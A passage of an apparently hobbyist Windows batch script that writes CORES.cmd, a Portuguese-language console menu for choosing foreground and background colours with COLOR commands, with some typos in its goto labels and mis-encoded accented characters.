echo date /t >> CORES.cmd
echo time /t >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo. >> CORES.cmd
echo echo    ESCOLHA A COR DE SUA PREFERENCIA >> CORES.cmd
echo echo. >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo  0 = Preto        8 = Cinza >> CORES.cmd
echo echo  1 = Azul         9 = Azul claro >> CORES.cmd
echo echo  2 = Verde        A = Verde claro >> CORES.cmd
echo echo  3 = Verde- gua   B = Verde- gua cl ro >> CORES.cmd
echo echo  4 = Vermelho     C = Vermelho claro >> CORES.cmd
echo echo  5 = Roxo         D = Lil s >> CORES.cmd
echo echo  6 = Amarelo      E = Amarelo claro >> CORES.cmd
echo echo  7 = Branco       F = Branco brilhante >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd

echo ping 127.0.0.1 -n 2 ^> nul >> CORES.cmd
echo color 2f >> CORES.cmd

echo CLS >> CORES.cmd
echo date /t >> CORES.cmd
echo time /t >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo. >> CORES.cmd
echo echo    ESCOLHA A COR DE SUA PREFERENCIA >> CORES.cmd
echo echo. >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo  0 = Preto        8 = Cinza >> CORES.cmd
echo echo  1 = Azul         9 = Azul claro >> CORES.cmd
echo echo  2 = Verde        A = Verde claro >> CORES.cmd
echo echo  3 = Verde- gua   B = Verde- gua cl ro >> CORES.cmd
echo echo  4 = Vermelho     C = Vermelho claro >> CORES.cmd
echo echo  5 = Roxo         D = Lil s >> CORES.cmd
echo echo  6 = Amarelo      E = Amarelo claro >> CORES.cmd
echo echo  7 = Branco       F = Branco brilhante >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd

echo ping 127.0.0.1 -n 2 ^> nul >> CORES.cmd
echo color 3f >> CORES.cmd

echo :in >> CORES.cmd
echo @echo off >> CORES.cmd
echo title >> CORES.cmd
echo CLS >> CORES.cmd
echo date /t >> CORES.cmd
echo time /t >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo. >> CORES.cmd
echo echo    ESCOLHA A COR DE SUA PREFERENCIA >> CORES.cmd
echo echo. >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo  0 = Preto        8 = Cinza >> CORES.cmd
echo echo  1 = Azul         9 = Azul claro >> CORES.cmd
echo echo  2 = Verde        A = Verde claro >> CORES.cmd
echo echo  3 = Verde- gua   B = Verde- gua cl ro >> CORES.cmd
echo echo  4 = Vermelho     C = Vermelho claro >> CORES.cmd
echo echo  5 = Roxo         D = Lil s >> CORES.cmd
echo echo  6 = Amarelo      E = Amarelo claro >> CORES.cmd
echo echo  7 = Branco       F = Branco brilhante >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo set /p op=digite sua opฦo  >> CORES.cmd
echo if %%op%% equ %%op%% goto %%op%% >> CORES.cmd



echo ::Sำ AS LETRAS >> CORES.cmd
echo. >> CORES.cmd
echo :0 >> CORES.cmd
echo COLOR 0 >> CORES.cmd
echo goto in >> CORES.cmd
echo :1 >> CORES.cmd
echo COLOR 1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :2 >> CORES.cmd
echo COLOR 2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :3 >> CORES.cmd
echo COLOR 3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :4 >> CORES.cmd
echo COLOR 4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :5 >> CORES.cmd
echo COLOR 5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :6 >> CORES.cmd
echo COLOR 6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :7 >> CORES.cmd
echo COLOR 7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :8 >> CORES.cmd
echo COLOR 8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :9 >> CORES.cmd
echo COLOR 9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A >> CORES.cmd
echo COLOR A >> CORES.cmd
echo goto in >> CORES.cmd
echo :B >> CORES.cmd
echo COLOR B >> CORES.cmd
echo goto in >> CORES.cmd
echo :C >> CORES.cmd
echo COLOR C >> CORES.cmd
echo goto in >> CORES.cmd
echo :D >> CORES.cmd
echo COLOR D >> CORES.cmd
echo goto in >> CORES.cmd
echo :E >> CORES.cmd
echo COLOR E >> CORES.cmd
echo goto in >> CORES.cmd
echo :F >> CORES.cmd
echo COLOR F >> CORES.cmd
echo goto in >> CORES.cmd
echo. >> CORES.cmd
echo ::FUNDO PRETO >> CORES.cmd
echo. >> CORES.cmd
echo :00 >> CORES.cmd
echo COLOR 00 >> CORES.cmd
echo goto in >> CORES.cmd
echo :01 >> CORES.cmd
echo COLOR 01 >> CORES.cmd
echo goto in >> CORES.cmd
echo :02 >> CORES.cmd
echo COLOR 02 >> CORES.cmd
echo goto in >> CORES.cmd
echo :03 >> CORES.cmd
echo COLOR 03 >> CORES.cmd
echo goto in >> CORES.cmd
echo :04 >> CORES.cmd
echo COLOR 04 >> CORES.cmd
echo goto in >> CORES.cmd
echo :05 >> CORES.cmd
echo COLOR 05 >> CORES.cmd
echo goto in >> CORES.cmd
echo :06 >> CORES.cmd
echo COLOR 06 >> CORES.cmd
echo goto in >> CORES.cmd
echo :07 >> CORES.cmd
echo COLOR 07 >> CORES.cmd
echo goto in >> CORES.cmd
echo :08 >> CORES.cmd
echo COLOR 08 >> CORES.cmd
echo goto in >> CORES.cmd
echo :09 >> CORES.cmd
echo COLOR 09 >> CORES.cmd
echo goto in >> CORES.cmd
echo :0A >> CORES.cmd
echo COLOR 0A >> CORES.cmd
echo goto in >> CORES.cmd
echo :0B >> CORES.cmd
echo COLOR 0B >> CORES.cmd
echo goto in >> CORES.cmd
echo :0C >> CORES.cmd
echo COLOR 0C >> CORES.cmd
echo goto in >> CORES.cmd
echo :0D >> CORES.cmd
echo COLOR 0D >> CORES.cmd
echo goto in >> CORES.cmd
echo :0E >> CORES.cmd
echo COLOR 0E >> CORES.cmd
echo goto in >> CORES.cmd
echo :0F >> CORES.cmd
echo COLOR 0F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO PRETO >> CORES.cmd
echo. >> CORES.cmd
echo :10 >> CORES.cmd
echo COLOR 10 >> CORES.cmd
echo goto in >> CORES.cmd
echo :11 >> CORES.cmd
echo COLOR 11 >> CORES.cmd
echo goto in >> CORES.cmd
echo :12 >> CORES.cmd
echo COLOR 12 >> CORES.cmd
echo goto in >> CORES.cmd
echo :13 >> CORES.cmd
echo COLOR 13 >> CORES.cmd
echo goto in >> CORES.cmd
echo :14 >> CORES.cmd
echo COLOR 14 >> CORES.cmd
echo goto in >> CORES.cmd
echo :15 >> CORES.cmd
echo COLOR 15 >> CORES.cmd
echo goto in >> CORES.cmd
echo :16 >> CORES.cmd
echo COLOR 16 >> CORES.cmd
echo goto in >> CORES.cmd
echo :17 >> CORES.cmd
echo COLOR 17 >> CORES.cmd
echo goto in >> CORES.cmd
echo :18 >> CORES.cmd
echo COLOR 18 >> CORES.cmd
echo goto in >> CORES.cmd
echo :19 >> CORES.cmd
echo COLOR 19 >> CORES.cmd
echo goto in >> CORES.cmd
echo :1A >> CORES.cmd
echo COLOR 1A >> CORES.cmd
echo  goto in >> CORES.cmd
echo :1B >> CORES.cmd
echo COLOR 1B >> CORES.cmd
echo goto in >> CORES.cmd
echo :1C >> CORES.cmd
echo COLOR 1C >> CORES.cmd
echo goto in >> CORES.cmd
echo :1D >> CORES.cmd
echo COLOR 1D >> CORES.cmd
echo goto in >> CORES.cmd
echo :1E >> CORES.cmd
echo COLOR 1E >> CORES.cmd
echo goto in >> CORES.cmd
echo :1F >> CORES.cmd
echo COLOR 1F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO VERDE >> CORES.cmd
echo :20 >> CORES.cmd
echo COLOR 20 >> CORES.cmd
echo goto in >> CORES.cmd
echo :21 >> CORES.cmd
echo COLOR 21 >> CORES.cmd
echo goto in >> CORES.cmd
echo :22 >> CORES.cmd
echo COLOR 22 >> CORES.cmd
echo goto in >> CORES.cmd
echo :23 >> CORES.cmd
echo COLOR 23 >> CORES.cmd
echo goto in >> CORES.cmd
echo :24 >> CORES.cmd
echo COLOR 24 >> CORES.cmd
echo goto in >> CORES.cmd
echo :25 >> CORES.cmd
echo COLOR 25 >> CORES.cmd
echo goto in >> CORES.cmd
echo :26 >> CORES.cmd
echo COLOR 26 >> CORES.cmd
echo goto in >> CORES.cmd
echo :27 >> CORES.cmd
echo COLOR 27 >> CORES.cmd
echo goto in >> CORES.cmd
echo :28 >> CORES.cmd
echo COLOR 28 >> CORES.cmd
echo goto in >> CORES.cmd
echo :29 >> CORES.cmd
echo COLOR 29 >> CORES.cmd
echo goto in >> CORES.cmd
echo :2A >> CORES.cmd
echo COLOR 2A >> CORES.cmd
echo goto in >> CORES.cmd
echo :2B >> CORES.cmd
echo COLOR 2B >> CORES.cmd
echo goto in >> CORES.cmd
echo :2C >> CORES.cmd
echo COLOR 2C >> CORES.cmd
echo goto in >> CORES.cmd
echo :2D >> CORES.cmd
echo COLOR 2D >> CORES.cmd
echo goto in >> CORES.cmd
echo :2E >> CORES.cmd
echo COLOR 2E >> CORES.cmd
echo goto in >> CORES.cmd
echo :2F >> CORES.cmd
echo COLOR 2F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDOVERDE-AGUA >> CORES.cmd
echo :30 >> CORES.cmd
echo COLOR 30 >> CORES.cmd
echo goto in >> CORES.cmd
echo :31 >> CORES.cmd
echo COLOR 31 >> CORES.cmd
echo goto in >> CORES.cmd
echo :32 >> CORES.cmd
echo COLOR 32 >> CORES.cmd
echo goto in >> CORES.cmd
echo :33 >> CORES.cmd
echo COLOR 33 >> CORES.cmd
echo goto in >> CORES.cmd
echo :34 >> CORES.cmd
echo COLOR 34 >> CORES.cmd
echo goto in >> CORES.cmd
echo :35 >> CORES.cmd
echo COLOR 35 >> CORES.cmd
echo goto in >> CORES.cmd
echo :36 >> CORES.cmd
echo COLOR 36 >> CORES.cmd
echo goto inv >> CORES.cmd
echo :37 >> CORES.cmd
echo COLOR 37 >> CORES.cmd
echo goto in >> CORES.cmd
echo :38 >> CORES.cmd
echo COLOR 38 >> CORES.cmd
echo goto in >> CORES.cmd
echo :39 >> CORES.cmd
echo COLOR 39 >> CORES.cmd
echo goto in >> CORES.cmd
echo :3A >> CORES.cmd
echo COLOR 3A >> CORES.cmd
echo goto in >> CORES.cmd
echo :3B >> CORES.cmd
echo COLOR 3B >> CORES.cmd
echo goto in >> CORES.cmd
echo :3C >> CORES.cmd
echo COLOR 3C >> CORES.cmd
echo goto in >> CORES.cmd
echo :3D >> CORES.cmd
echo COLOR 3D >> CORES.cmd
echo goto in >> CORES.cmd
echo :3E >> CORES.cmd
echo COLOR 3E >> CORES.cmd
echo goto in >> CORES.cmd
echo :3F >> CORES.cmd
echo COLOR 3F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO VERMELHO >> CORES.cmd
echo :40 >> CORES.cmd
echo COLOR 40 >> CORES.cmd
echo goto in >> CORES.cmd
echo :41 >> CORES.cmd
echo COLOR 41 >> CORES.cmd
echo goto in >> CORES.cmd
echo :42 >> CORES.cmd
echo COLOR 42 >> CORES.cmd
echo goto in >> CORES.cmd
echo :43 >> CORES.cmd
echo COLOR 43 >> CORES.cmd
echo goto in >> CORES.cmd
echo :44 >> CORES.cmd
echo COLOR 44 >> CORES.cmd
echo goto in >> CORES.cmd
echo :45 >> CORES.cmd
echo COLOR 45 >> CORES.cmd
echo goto in >> CORES.cmd
echo :46 >> CORES.cmd
echo COLOR 46 >> CORES.cmd
echo goto in >> CORES.cmd
echo :47 >> CORES.cmd
echo COLOR 47 >> CORES.cmd
echo goto in >> CORES.cmd
echo :48 >> CORES.cmd
echo COLOR 48 >> CORES.cmd
echo goto in >> CORES.cmd
echo :49 >> CORES.cmd
echo COLOR 49 >> CORES.cmd
echo goto in >> CORES.cmd
echo :4A >> CORES.cmd
echo COLOR 4A >> CORES.cmd
echo goto in >> CORES.cmd
echo :4B >> CORES.cmd
echo COLOR 4B >> CORES.cmd
echo goto in >> CORES.cmd
echo :4C >> CORES.cmd
echo COLOR 4C >> CORES.cmd
echo goto in >> CORES.cmd
echo :4D >> CORES.cmd
echo COLOR 4D >> CORES.cmd
echo goto in >> CORES.cmd
echo :4E >> CORES.cmd
echo COLOR 4E >> CORES.cmd
echo goto in >> CORES.cmd
echo :4F >> CORES.cmd
echo COLOR 4F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO ROXO >> CORES.cmd
echo. >> CORES.cmd
echo :50 >> CORES.cmd
echo COLOR 50 >> CORES.cmd
echo :51 >> CORES.cmd
echo COLOR 51 >> CORES.cmd
echo goto in >> CORES.cmd
echo :52 >> CORES.cmd
echo COLOR 52 >> CORES.cmd
echo goto in >> CORES.cmd
echo :53 >> CORES.cmd
echo COLOR 53 >> CORES.cmd
echo goto in >> CORES.cmd
echo :54 >> CORES.cmd
echo COLOR 54 >> CORES.cmd
echo goto in >> CORES.cmd
echo :55 >> CORES.cmd
echo COLOR 55 >> CORES.cmd
echo goto in >> CORES.cmd
echo :56 >> CORES.cmd
echo COLOR 56 >> CORES.cmd
echo goto in >> CORES.cmd
echo :57 >> CORES.cmd
echo COLOR 57 >> CORES.cmd
echo goto in >> CORES.cmd
echo :58 >> CORES.cmd
echo COLOR 58 >> CORES.cmd
echo goto in >> CORES.cmd 
echo :59 >> CORES.cmd
echo COLOR 59 >> CORES.cmd
echo goto in >> CORES.cmd
echo :5A >> CORES.cmd
echo COLOR 5A >> CORES.cmd
echo goto in >> CORES.cmd
echo :5B >> CORES.cmd
echo COLOR 5B >> CORES.cmd
echo goto in >> CORES.cmd
echo :5C >> CORES.cmd
echo COLOR 5C >> CORES.cmd
echo goto in >> CORES.cmd
echo :5D >> CORES.cmd
echo COLOR 5D >> CORES.cmd
echo goto in >> CORES.cmd
echo :5E >> CORES.cmd
echo COLOR 5E >> CORES.cmd
echo goto in >> CORES.cmd
echo :5F >> CORES.cmd
echo COLOR 5F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO AMARELO >> CORES.cmd
echo :60 >> CORES.cmd
echo COLOR 60 >> CORES.cmd
echo :61 >> CORES.cmd
echo COLOR 61 >> CORES.cmd
echo goto in >> CORES.cmd
echo :62 >> CORES.cmd
echo COLOR 62 >> CORES.cmd
echo goto in >> CORES.cmd
echo :63 >> CORES.cmd
echo COLOR 63 >> CORES.cmd
echo goto in >> CORES.cmd
echo :64 >> CORES.cmd
echo COLOR 64 >> CORES.cmd
echo goto in >> CORES.cmd
echo :65 >> CORES.cmd
echo COLOR 65 >> CORES.cmd
echo goto in >> CORES.cmd
echo :66 >> CORES.cmd
echo COLOR 66 >> CORES.cmd
echo goto in >> CORES.cmd
echo :67 >> CORES.cmd
echo COLOR 67 >> CORES.cmd
echo goto in >> CORES.cmd
echo :68 >> CORES.cmd
echo COLOR 68 >> CORES.cmd
echo goto in >> CORES.cmd
echo :69 >> CORES.cmd
echo COLOR 69 >> CORES.cmd
echo goto in >> CORES.cmd
echo :6A >> CORES.cmd
echo COLOR 6A >> CORES.cmd
echo goto in >> CORES.cmd
echo :6B >> CORES.cmd
echo COLOR 6B >> CORES.cmd
echo goto in >> CORES.cmd
echo :6C >> CORES.cmd
echo COLOR 6C >> CORES.cmd
echo goto in >> CORES.cmd
echo :6D >> CORES.cmd
echo COLOR 6D >> CORES.cmd
echo goto in >> CORES.cmd
echo :6E >> CORES.cmd
echo COLOR 6E >> CORES.cmd
echo goto inv
echo :6F >> CORES.cmd
echo COLOR 6F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDOBRANCO >> CORES.cmd
echo :70 >> CORES.cmd
echo COLOR 70 >> CORES.cmd
echo :71 >> CORES.cmd
echo COLOR 71 >> CORES.cmd
echo goto in >> CORES.cmd
echo :72 >> CORES.cmd
echo COLOR 72 >> CORES.cmd
echo goto in >> CORES.cmd
echo :73 >> CORES.cmd
echo COLOR 73 >> CORES.cmd
echo goto in >> CORES.cmd
echo :74 >> CORES.cmd
echo COLOR 74 >> CORES.cmd
echo goto in >> CORES.cmd
echo :75 >> CORES.cmd
echo COLOR 75 >> CORES.cmd
echo goto in >> CORES.cmd
echo :76 >> CORES.cmd
echo COLOR 76 >> CORES.cmd
echo goto in >> CORES.cmd
echo :77 >> CORES.cmd
echo COLOR 77 >> CORES.cmd
echo goto in >> CORES.cmd
echo :78 >> CORES.cmd
echo COLOR 78 >> CORES.cmd
echo goto in >> CORES.cmd
echo :79 >> CORES.cmd
echo COLOR 79 >> CORES.cmd
echo goto in >> CORES.cmd
echo :7A >> CORES.cmd
echo COLOR 7A >> CORES.cmd
echo goto in >> CORES.cmd
echo :7B >> CORES.cmd
echo COLOR 7B >> CORES.cmd
echo goto in >> CORES.cmd
echo :7C >> CORES.cmd
echo COLOR 7C >> CORES.cmd
echo goto in >> CORES.cmd
echo :7D >> CORES.cmd
echo COLOR 7D >> CORES.cmd
echo goto in >> CORES.cmd
echo :7E >> CORES.cmd
echo COLOR 7E >> CORES.cmd
echo goto in >> CORES.cmd
echo :7F >> CORES.cmd
echo COLOR 7F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO CINZA >> CORES.cmd
echo :80 >> CORES.cmd
echo COLOR 80 >> CORES.cmd
echo :81 >> CORES.cmd
echo COLOR 81 >> CORES.cmd
echo goto in >> CORES.cmd
echo :82 >> CORES.cmd
echo COLOR 82 >> CORES.cmd
echo goto in >> CORES.cmd
echo :83 >> CORES.cmd
echo COLOR 83 >> CORES.cmd
echo goto in >> CORES.cmd
echo :84 >> CORES.cmd
echo COLOR 84 >> CORES.cmd
echo goto in >> CORES.cmd
echo :85 >> CORES.cmd
echo COLOR 85 >> CORES.cmd 
echo goto in >> CORES.cmd
echo :86 >> CORES.cmd
echo COLOR 86 >> CORES.cmd
echo goto in >> CORES.cmd
echo :87 >> CORES.cmd
echo COLOR 87 >> CORES.cmd
echo goto in >> CORES.cmd
echo :88 >> CORES.cmd
echo COLOR 88 >> CORES.cmd
echo goto in >> CORES.cmd
echo :89 >> CORES.cmd
echo COLOR 89 >> CORES.cmd
echo goto in >> CORES.cmd
echo :8A >> CORES.cmd
echo COLOR 8A >> CORES.cmd
echo goto in >> CORES.cmd
echo :8B >> CORES.cmd
echo COLOR 8B >> CORES.cmd
echo goto in >> CORES.cmd
echo :8C >> CORES.cmd
echo COLOR 8C >> CORES.cmd
echo goto in >> CORES.cmd
echo :8D >> CORES.cmd
echo COLOR 8D >> CORES.cmd
echo goto in >> CORES.cmd
echo :8E >> CORES.cmd
echo COLOR 8E >> CORES.cmd
echo goto in >> CORES.cmd
echo :8F >> CORES.cmd
echo COLOR 8F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO AZUL CLARO >> CORES.cmd
echo :90 >> CORES.cmd
echo goto in >> CORES.cmd
echo COLOR 90 >> CORES.cmd
echo :91 >> CORES.cmd
echo COLOR 91 >> CORES.cmd
echo goto in >> CORES.cmd
echo :92 >> CORES.cmd
echo COLOR 92 >> CORES.cmd
echo goto in >> CORES.cmd
echo :93 >> CORES.cmd
echo COLOR 93 >> CORES.cmd
echo goto in >> CORES.cmd
echo :94 >> CORES.cmd
echo COLOR 94 >> CORES.cmd
echo goto in >> CORES.cmd
echo :95 >> CORES.cmd
echo COLOR 95 >> CORES.cmd
echo goto in >> CORES.cmd
echo :96 >> CORES.cmd 
echo COLOR 96 >> CORES.cmd
echo goto in >> CORES.cmd
echo :97 >> CORES.cmd
echo COLOR 97 >> CORES.cmd
echo goto in >> CORES.cmd
echo :98 >> CORES.cmd
echo COLOR 98 >> CORES.cmd
echo goto in >> CORES.cmd
echo :99 >> CORES.cmd
echo COLOR 99 >> CORES.cmd
echo goto in >> CORES.cmd
echo :9A >> CORES.cmd
echo COLOR 9A >> CORES.cmd
echo goto in >> CORES.cmd
echo :9B >> CORES.cmd
echo COLOR 9B >> CORES.cmd
echo goto in >> CORES.cmd
echo :9C >> CORES.cmd
echo COLOR 9C >> CORES.cmd
echo goto in >> CORES.cmd
echo :9D >> CORES.cmd
echo COLOR 9D >> CORES.cmd
echo goto in >> CORES.cmd
echo :9E >> CORES.cmd
echo COLOR 9E >> CORES.cmd
echo goto in >> CORES.cmd
echo :9F >> CORES.cmd
echo COLOR 9F >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO VERDE CLARO >> CORES.cmd
echo :A0 >> CORES.cmd
echo COLOR A0 >> CORES.cmd
echo :A1 >> CORES.cmd
echo COLOR A1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A2 >> CORES.cmd
echo COLOR A2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A3 >> CORES.cmd
echo COLOR A3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A4 >> CORES.cmd
echo COLOR A4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A5 >> CORES.cmd
echo COLOR A5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A6 >> CORES.cmd
echo COLOR A6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A7 >> CORES.cmd
echo COLOR A7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A8 >> CORES.cmd
echo COLOR A8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :A9 >> CORES.cmd
echo COLOR A9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :AA >> CORES.cmd
echo COLOR AA >> CORES.cmd
echo goto in >> CORES.cmd
echo :AB >> CORES.cmd
echo COLOR AB >> CORES.cmd
echo goto in >> CORES.cmd
echo :AC >> CORES.cmd
echo COLOR AC >> CORES.cmd
echo goto in >> CORES.cmd
echo :AD >> CORES.cmd
echo COLOR AD >> CORES.cmd
echo goto in >> CORES.cmd
echo :AE >> CORES.cmd
echo COLOR AE >> CORES.cmd
echo goto in >> CORES.cmd
echo :AF >> CORES.cmd
echo COLOR AF >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO VERDE-AGUA CLARO >> CORES.cmd
echo :B0 >> CORES.cmd
echo COLOR B0 >> CORES.cmd
echo :B1 >> CORES.cmd
echo COLOR B1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B2 >> CORES.cmd
echo COLOR B2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B3 >> CORES.cmd
echo COLOR B3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B4 >> CORES.cmd
echo COLOR B4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B5 >> CORES.cmd
echo COLOR B5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B6 >> CORES.cmd
echo COLOR B6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B7 >> CORES.cmd
echo COLOR B7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B8 >> CORES.cmd
echo COLOR B8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :B9 >> CORES.cmd
echo COLOR B9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :BA >> CORES.cmd
echo COLOR BA >> CORES.cmd
echo goto in >> CORES.cmd
echo :BB >> CORES.cmd
echo COLOR BB >> CORES.cmd
echo goto in >> CORES.cmd
echo :BC >> CORES.cmd
echo COLOR BC >> CORES.cmd
echo goto in >> CORES.cmd
echo :BD >> CORES.cmd
echo COLOR BD >> CORES.cmd
echo goto in >> CORES.cmd
echo :BE >> CORES.cmd
echo COLOR BE >> CORES.cmd
echo goto in >> CORES.cmd
echo :BF >> CORES.cmd
echo COLOR BF >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO VERMELHO CLARO >> CORES.cmd
echo :C0 >> CORES.cmd
echo COLOR C0 >> CORES.cmd
echo :C1 >> CORES.cmd
echo COLOR C1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C2 >> CORES.cmd
echo COLOR C2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C3 >> CORES.cmd
echo COLOR C3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C4 >> CORES.cmd
echo COLOR C4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C5 >> CORES.cmd
echo COLOR C5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C6 >> CORES.cmd
echo COLOR C6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C7 >> CORES.cmd
echo COLOR C7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C8 >> CORES.cmd
echo COLOR C8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :C9 >> CORES.cmd
echo COLOR C9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :CA >> CORES.cmd
echo COLOR CA >> CORES.cmd
echo goto in >> CORES.cmd
echo :CB >> CORES.cmd
echo COLOR CB >> CORES.cmd
echo goto in >> CORES.cmd
echo :CC >> CORES.cmd
echo COLOR CC >> CORES.cmd
echo goto in >> CORES.cmd
echo :CD >> CORES.cmd
echo COLOR CD >> CORES.cmd
echo goto in >> CORES.cmd
echo :CE >> CORES.cmd
echo COLOR CE >> CORES.cmd
echo goto in >> CORES.cmd
echo :CF >> CORES.cmd
echo COLOR CF >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO LILAS >> CORES.cmd
echo :D0 >> CORES.cmd
echo COLOR D0 >> CORES.cmd
echo :D1 >> CORES.cmd
echo COLOR D1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D2 >> CORES.cmd
echo COLOR D2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D3 >> CORES.cmd
echo COLOR D3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D4 >> CORES.cmd
echo COLOR D4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D5 >> CORES.cmd
echo COLOR D5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D6 >> CORES.cmd
echo COLOR D6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D7 >> CORES.cmd
echo COLOR D7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D8 >> CORES.cmd
echo COLOR D8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :D9 >> CORES.cmd
echo COLOR D9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :DA >> CORES.cmd
echo COLOR DA >> CORES.cmd
echo goto in >> CORES.cmd
echo :DB >> CORES.cmd
echo COLOR DB >> CORES.cmd
echo goto in >> CORES.cmd
echo :DC >> CORES.cmd
echo COLOR DC >> CORES.cmd
echo goto in >> CORES.cmd
echo :DD >> CORES.cmd
echo COLOR DD >> CORES.cmd
echo goto in >> CORES.cmd
echo :DE >> CORES.cmd
echo COLOR DE >> CORES.cmd
echo goto in >> CORES.cmd
echo :DF >> CORES.cmd
echo COLOR DF >> CORES.cmd
echo goto in >> CORES.cmd
echo ::FUNDO AMARELO CLARO >> CORES.cmd
echo :E0 >> CORES.cmd
echo COLOR E0 >> CORES.cmd
echo :E1 >> CORES.cmd
echo COLOR E1 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E2 >> CORES.cmd
echo COLOR E2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E3 >> CORES.cmd
echo COLOR E3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E4 >> CORES.cmd
echo COLOR E4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E5 >> CORES.cmd
echo COLOR E5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E6 >> CORES.cmd
echo COLOR E6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E7 >> CORES.cmd
echo COLOR E7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E8 >> CORES.cmd
echo COLOR E8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :E9 >> CORES.cmd
echo COLOR E9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :EA >> CORES.cmd
echo COLOR EA >> CORES.cmd
echo goto in >> CORES.cmd
echo :EB >> CORES.cmd
echo COLOR EB >> CORES.cmd
echo goto in >> CORES.cmd
echo :EC >> CORES.cmd
echo COLOR EC >> CORES.cmd
echo goto in >> CORES.cmd
echo :ED >> CORES.cmd
echo COLOR ED >> CORES.cmd
echo goto in >> CORES.cmd
echo :EE >> CORES.cmd
echo COLOR EE >> CORES.cmd
echo goto in >> CORES.cmd
echo :EF >> CORES.cmd
echo COLOR EF >> CORES.cmd
echo goto in >> CORES.cmd
echo. >> CORES.cmd
echo ::FUNDO BRANCO BRILHANTE >> CORES.cmd
echo :F0 >> CORES.cmd
echo COLOR F0 >> CORES.cmd
echo :F1 >> CORES.cmd
echo COLOR F1 >> CORES.cmd
echo goto in >> CORES.cmd
echo. >> CORES.cmd
echo :F2 >> CORES.cmd
echo COLOR F2 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F3 >> CORES.cmd
echo COLOR F3 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F4 >> CORES.cmd
echo COLOR F4 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F5 >> CORES.cmd
echo COLOR F5 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F6 >> CORES.cmd
echo COLOR F6 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F7 >> CORES.cmd
echo COLOR F7 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F8 >> CORES.cmd
